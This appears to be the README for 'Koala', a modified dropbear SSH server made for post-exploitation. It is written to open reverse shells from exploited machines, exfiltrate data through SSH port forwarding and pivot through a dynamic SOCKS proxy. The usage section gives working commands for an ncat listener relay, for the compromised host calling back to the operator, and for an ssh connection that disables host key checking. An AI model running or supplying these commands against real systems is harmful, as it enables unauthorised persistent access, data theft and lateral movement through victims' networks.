Koala is a patched version of the dropbear SSH server that instead of
binding to a port opens up reverse shells by connecting to a remote
client.

This is useful for gaining a pty terminal on an exploited machine and
also for secure exfiltration of data via SSH port forwarding. Pivoting
can also be done by using the dynamic SSH port forwarding feature.


[Usage]

Run the following command on the client to listen for the SSH connection:
$ ncat -lvp 5000 --sh-exec 'ncat -lvp 9999'

On the exploited host run:
$ ./dropbear -p client-host:5000

Now on the client, connect to port 9999 to open up a shell:
$ ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null localhost -D9050 -p9999
